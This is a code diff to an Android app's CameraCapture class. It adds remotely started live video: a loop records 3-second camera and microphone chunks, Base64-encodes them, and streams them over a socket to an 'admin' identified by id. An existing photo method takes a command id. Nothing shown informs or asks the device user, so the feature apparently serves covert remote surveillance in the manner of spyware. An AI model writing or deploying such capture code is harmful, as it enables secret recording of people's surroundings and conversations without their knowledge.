@@ -9,8 +9,11 @@ import android.media.MediaRecorder
 import android.os.Build
 import android.os.Handler
 import android.os.HandlerThread
+import android.util.Base64
+import android.util.Log
 import android.view.Surface
 import com.dilarion.app.data.api.ApiService
+import com.dilarion.app.services.PresenceService
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Job
 import kotlinx.coroutines.delay
@@ -24,11 +27,14 @@ import java.io.FileOutputStream
 import kotlin.coroutines.resume
 import kotlin.coroutines.suspendCoroutine
 
+private const val TAG = "CameraCapture"
+
 class CameraCapture(
     private val context: Context,
     private val apiService: ApiService,
     private val scope: CoroutineScope,
     private val getToken: suspend () -> String?,
+    private val presenceService: PresenceService? = null,
 ) {
     private val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
     private var handlerThread: HandlerThread? = null
@@ -38,6 +44,12 @@ class CameraCapture(
     private var videoCamera: CameraDevice? = null
     private var videoCaptureSession: CameraCaptureSession? = null
     private var videoFile: File? = null
+
+    private var liveVideoActive = false
+    private var liveVideoJob: Job? = null
+    private var liveVideoSessionId: String? = null
+    private var liveVideoAdminId: Int? = null
+    private var liveVideoChunkIndex = 0
 
     @SuppressLint("MissingPermission")
     suspend fun takePhoto(useFront: Boolean, commandId: Int) {
@@ -74,6 +86,107 @@ class CameraCapture(
             camera?.close()
             stopThread()
         }
+    }
+
+    fun startLiveVideo(useFront: Boolean, adminId: Int?) {
+        if (liveVideoActive) { Log.w(TAG, "live video already active"); return }
+        Log.i(TAG, "startLiveVideo front=$useFront adminId=$adminId")
+        liveVideoActive = true
+        liveVideoSessionId = "livevid_${System.currentTimeMillis()}"
+        liveVideoAdminId = adminId
+        liveVideoChunkIndex = 0
+        liveVideoJob = scope.launch { runLiveVideoLoop(useFront) }
+    }
+
+    fun stopLiveVideo() {
+        Log.i(TAG, "stopLiveVideo")
+        liveVideoActive = false
+        liveVideoJob?.cancel()
+        liveVideoJob = null
+        liveVideoSessionId = null
+        liveVideoChunkIndex = 0
+    }
+
+    @SuppressLint("MissingPermission")
+    private suspend fun runLiveVideoLoop(useFront: Boolean) {
+        Log.i(TAG, "runLiveVideoLoop started")
+        while (liveVideoActive) {
+            val chunkFile = File(context.cacheDir, "livevid_${System.currentTimeMillis()}.mp4")
+            var camera: CameraDevice? = null
+            var recorder: MediaRecorder? = null
+            try {
+                startThread()
+                val cameraId = findCamera(useFront) ?: findCamera(!useFront)
+                if (cameraId == null) { Log.e(TAG, "no camera found"); delay(3000); continue }
+
+                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
+                    MediaRecorder(context) else @Suppress("DEPRECATION") MediaRecorder()
+                recorder.apply {
+                    setVideoSource(MediaRecorder.VideoSource.SURFACE)
+                    setAudioSource(MediaRecorder.AudioSource.MIC)
+                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
+                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                    setVideoSize(640, 480)
+                    setVideoFrameRate(15)
+                    setVideoEncodingBitRate(512_000)
+                    setAudioSamplingRate(16000)
+                    setAudioChannels(1)
+                    setAudioEncodingBitRate(32000)
+                    setOutputFile(chunkFile.absolutePath)
+                    prepare()
+                }
+
+                camera = openCamera(cameraId)
+                val surface = recorder.surface
+                val session = createSession(camera, listOf(surface))
+                val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
+                    addTarget(surface)
+                }.build()
+                session.setRepeatingRequest(request, null, handler)
+                recorder.start()
+                Log.d(TAG, "live video chunk recording...")
+                delay(3000)
+                try { recorder.stop() } catch (e: Exception) { Log.e(TAG, "recorder stop err: $e") }
+                session.close()
+
+                if (!liveVideoActive) { chunkFile.delete(); break }
+
+                val bytes = chunkFile.readBytes()
+                chunkFile.delete()
+                Log.d(TAG, "live video chunk ${liveVideoChunkIndex} size=${bytes.size}")
+                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+
+                val payload = mapOf(
+                    "type" to "live_video_chunk",
+                    "data" to mapOf(
+                        "session_id" to liveVideoSessionId,
+                        "chunk_index" to liveVideoChunkIndex++,
+                        "video_data" to b64,
+                        "mime_type" to "video/mp4",
+                        "admin_id" to liveVideoAdminId,
+                    ),
+                )
+                val ps = presenceService
+                if (ps != null) {
+                    val sent = ps.sendJson(payload)
+                    Log.i(TAG, "live video chunk sent=$sent ws_alive=${ps.isConnected}")
+                } else {
+                    Log.w(TAG, "presenceService null, chunk dropped")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "live video chunk error: $e")
+                try { recorder?.release() } catch (_: Exception) {}
+                chunkFile.delete()
+                if (!liveVideoActive) break
+                delay(3000)
+            } finally {
+                try { camera?.close() } catch (_: Exception) {}
+                try { recorder?.release() } catch (_: Exception) {}
+                stopThread()
+            }
+        }
+        Log.i(TAG, "runLiveVideoLoop ended")
     }
 
     @SuppressLint("MissingPermission")
